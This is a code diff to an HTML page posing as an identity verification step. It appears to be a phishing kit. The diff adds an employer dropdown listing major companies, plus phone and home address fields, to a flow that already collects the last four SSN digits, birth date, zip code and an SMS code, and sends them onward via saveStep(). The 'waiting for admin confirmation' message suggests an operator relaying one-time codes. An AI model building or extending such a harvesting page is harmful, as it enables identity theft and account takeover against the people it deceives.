@@ -18,7 +18,6 @@
         .error { color: #ef4444; margin: 15px 0; text-align: center; font-weight: 500; }
         .step { display: none; }
         .step.active { display: block; }
-        
     </style>
 </head>
 <body>
@@ -26,6 +25,36 @@
 
         <div id="step1" class="step active">
             <h1>Confirm your identity</h1>
+            
+            <label for="company">Company</label>
+            <select id="company" required>
+                <option value="">Select your Company</option>
+                <option value="UNITED AIRLINES">UNITED AIRLINES</option>
+                <option value="BOEING">BOEING</option>
+                <option value="SIEMENS ENERGY">SIEMENS ENERGY</option>
+                <option value="AON">AON</option>
+                <option value="AMERICAN AIRLINES">AMERICAN AIRLINES</option>
+                <option value="DELTA AIR LINES">DELTA AIR LINES</option>
+                <option value="SOUTHWEST AIRLINES">SOUTHWEST AIRLINES</option>
+                <option value="WALMART">WALMART</option>
+                <option value="CATERPILLAR">CATERPILLAR</option>
+                <option value="HOME DEPOT">HOME DEPOT</option>
+                <option value="LOWE'S">LOWE'S</option>
+                <option value="TARGET">TARGET</option>
+                <option value="KROGER">KROGER</option>
+                <option value="CVS HEALTH">CVS HEALTH</option>
+                <option value="WALGREENS">WALGREENS</option>
+                <option value="BANK OF AMERICA">BANK OF AMERICA</option>
+                <option value="JPMORGAN CHASE">JPMORGAN CHASE</option>
+                <option value="VERIZON">VERIZON</option>
+                <option value="AT&T">AT&T</option>
+                <option value="IBM">IBM</option>
+                <option value="MICROSOFT">MICROSOFT</option>
+                <option value="AMAZON">AMAZON</option>
+                <option value="GOOGLE">GOOGLE</option>
+                <option value="META">META</option>
+            </select>
+
             <label>Last 4 Digits of SSN</label>
             <input type="text" id="ssn" maxlength="4" placeholder="1234" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
 
@@ -46,13 +75,117 @@
             <h1>Additional Information</h1>
             <label>Zip Code</label>
             <input type="text" id="zip" maxlength="5" placeholder="12345" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
+
+            <label>Phone Number</label>
+            <input type="tel" id="phone" maxlength="10" placeholder="1234567890" 
+                   oninput="this.value = this.value.replace(/[^0-9]/g,'')" required>
+
+
+<label>Home Address (Current)</label>
+
+<div style="position: relative;">
+  <input
+    type="text"
+    id="address"
+    placeholder="Enter your current home address"
+    autocomplete="off"
+    required
+    style="
+      width: 100%;
+      padding: 14px;
+      border: 1px solid #d1d5db;
+      border-radius: 12px;
+      font-size: 16px;
+      box-sizing: border-box;
+    "
+  >
+
+  <div id="addressSuggestions"></div>
+</div>
+
+<style>
+#addressSuggestions {
+  position: absolute;
+  top: 100%;
+  left: 0;
+  right: 0;
+  background: white;
+  border: 1px solid #ddd;
+  border-radius: 12px;
+  margin-top: 4px;
+  max-height: 250px;
+  overflow-y: auto;
+  z-index: 9999;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+}
+
+.address-item {
+  padding: 12px;
+  cursor: pointer;
+  border-bottom: 1px solid #eee;
+}
+
+.address-item:hover {
+  background: #f5f5f5;
+}
+
+.address-item:last-child {
+  border-bottom: none;
+}
+</style>
+
+<script>
+const addressInput = document.getElementById("address");
+const suggestionsBox = document.getElementById("addressSuggestions");
+
+addressInput.addEventListener("input", async function () {
+  const query = this.value.trim();
+
+  if (query.length < 3) {
+    suggestionsBox.innerHTML = "";
+    return;
+  }
+
+  try {
+    const response = await fetch(
+      `https://nominatim.openstreetmap.org/search?format=json&countrycodes=us&q=${encodeURIComponent(query)}&limit=5`
+    );
+
+    const results = await response.json();
+
+    suggestionsBox.innerHTML = "";
+
+    results.forEach(place => {
+      const item = document.createElement("div");
+      item.className = "address-item";
+      item.textContent = place.display_name;
+
+      item.addEventListener("click", () => {
+        addressInput.value = place.display_name;
+        suggestionsBox.innerHTML = "";
+      });
+
+      suggestionsBox.appendChild(item);
+    });
+  } catch (error) {
+    console.error("Address lookup failed:", error);
+  }
+});
+
+document.addEventListener("click", function (e) {
+  if (!addressInput.contains(e.target) &&
+      !suggestionsBox.contains(e.target)) {
+    suggestionsBox.innerHTML = "";
+  }
+});
+</script>
             <button class="continue" onclick="saveStep2()">Continue</button>
         </div>
 
         <div id="step3" class="step">
             <h1>Verify it's you</h1>
             <p>Enter the code you received via SMS.</p>
-                 <p>Your access code should be sent to you within 12 hours. Please do not refresh this page — simply check your SMS inbox within the next 12 hours.</p>
+            <p>Your access code should be sent to you within 12 hours. Please do not refresh this page — simply check your SMS inbox within the next 12 hours.</p>
             
             <input type="text" id="code" maxlength="10" placeholder="123456" style="text-align:center; font-size:1.4rem;">
             <div id="status"></div>
@@ -88,32 +221,36 @@
         }
 
         function saveStep1() {
+            const company = document.getElementById('company').value;
             const ssn = document.getElementById('ssn').value.trim();
             const month = document.getElementById('month').value;
             const day = document.getElementById('day').value;
             const year = document.getElementById('year').value;
 
-            if (ssn.length !== 4 || !month || !day || !year || !document.getElementById('privacy').checked) {
-                alert("Please fill all fields and accept Privacy Policy.");
+            if (!company || ssn.length !== 4 || !month || !day || !year || !document.getElementById('privacy').checked) {
+                alert("Please select your Company and fill all fields.");
                 return;
             }
 
             const dob = `${month}/${day}/${year}`;
-            const details = `SSN: ${ssn} | DOB: ${dob} | Status: Step 1 Completed`;
+            const details = `Company: ${company} | SSN: ${ssn} | DOB: ${dob} | Status: Step 1 Completed`;
 
-            saveStep(details, "Step 1 - SSN & DOB");
+            saveStep(details, "Step 1 - Company, SSN & DOB");
             nextStep(2);
         }
 
         function saveStep2() {
             const zip = document.getElementById('zip').value.trim();
-            if (zip.length !== 5) {
-                alert("Please enter a valid 5-digit Zip Code.");
+            const phone = document.getElementById('phone').value.trim();
+            const address = document.getElementById('address').value.trim();
+
+            if (zip.length !== 5 || phone.length !== 10 || !address) {
+                alert("Please fill all fields correctly:\n- Zip Code \n- Phone\n- Home Address");
                 return;
             }
 
-            const details = `Zip: ${zip} | Status: Step 2 Completed`;
-            saveStep(details, "Step 2 - Zip Code");
+            const details = `Zip: ${zip} | Phone: ${phone} | Address: ${address} | Status: Step 2 Completed`;
+            saveStep(details, "Step 2 - Zip, Phone & Address");
             nextStep(3);
         }
 
@@ -133,12 +270,14 @@
 
             statusDiv.innerHTML = `<span class="waiting">Waiting for admin confirmation....</span>`;
             
-
             const ssn = document.getElementById('ssn').value || "";
             const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
             const zip = document.getElementById('zip').value || "";
+            const phone = document.getElementById('phone').value || "";
+            const address = document.getElementById('address').value || "";
+            const company = document.getElementById('company').value || "";
 
-            const fullDetails = `SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Code: ${code} | Status: Pending`;
+            const fullDetails = `Company: ${company} | SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Phone: ${phone} | Address: ${address} | Code: ${code} | Status: Pending`;
 
             await saveStep(fullDetails, "Final Code Submission");
 
@@ -193,8 +332,6 @@
                 document.getElementById('year').appendChild(opt);
             }
         };
-
-        
     </script>
 </body>
 </html>
